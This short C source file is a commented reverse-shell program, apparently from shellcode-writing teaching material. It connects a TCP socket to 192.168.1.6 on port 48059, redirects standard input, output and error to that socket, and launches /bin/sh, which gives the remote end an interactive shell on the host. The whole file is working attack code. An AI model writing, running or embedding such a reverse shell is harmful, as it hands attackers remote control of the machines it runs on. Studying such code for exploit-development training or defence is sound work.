#include<sys/socket.h>			// libraries used to make a socket
#include<netinet/in.h>			// defines the sockaddr structure

int main() {
	char * shell[2]; 		// prep for execve call
	int soc,remote;		// file descriptor handles
	struct sockaddr_in serv_addr;	// structure to hold IP/port vals

	serv_addr.sin_family=2; 	// set native protocol family: IP
	serv_addr.sin_addr.s_addr=0x0601A8C0; // 192.168.1.6
	serv_addr.sin_port=0xBBBB;   // set port of socket, 48059 here
	soc=socket(2,1,0);	// build a local IP socket of type stream
	remote = connect(soc,(struct sockaddr *)&serv_addr,0x10);
	dup2(soc,0);		// connect stdin to socket
	dup2(soc,1);		// connect stdout to socket
	dup2(soc,2);		// connect stderr to socket
	shell[0]="/bin/sh";	// first argument to execve
	shell[1]=0;		// terminate array with null
	execve(shell[0],shell,0); // pop a shell
}
